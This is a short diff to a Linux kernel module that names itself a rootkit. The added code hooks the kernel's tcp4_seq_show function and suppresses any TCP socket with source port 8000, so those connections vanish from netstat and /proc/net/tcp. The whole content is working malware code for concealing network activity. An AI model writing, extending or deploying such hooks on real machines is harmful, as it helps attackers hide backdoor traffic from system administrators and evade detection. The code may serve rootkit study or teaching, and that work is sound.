@@ -51,8 +51,21 @@ static void __exit rootkit_exit(void) {
 
 static asmlinkage int new_tcp4_seq_show(struct seq_file *seq, void *v)
 {
-	printk(KERN_INFO "hooked a call to tcp4_seq_show");
+	__u16 srcp;
+	const struct inet_sock *inet;
+	struct sock *sk = v;
+	printk(KERN_INFO "hooked a call to tcp4_seq_show\n");
+	if (v == SEQ_START_TOKEN)
+		return old_tcp4_seq_show(seq, v);
+	inet = inet_sk(sk);
+	srcp = ntohs(inet->inet_sport);
+	if (srcp == 8000){
+		printk(KERN_INFO "netstat_rootkit: identified tcp traffic to port 8000\n");
+		seq_puts(seq, "");
+		return 0;
+	}
 	return old_tcp4_seq_show(seq, v);
+	
 }
 
 
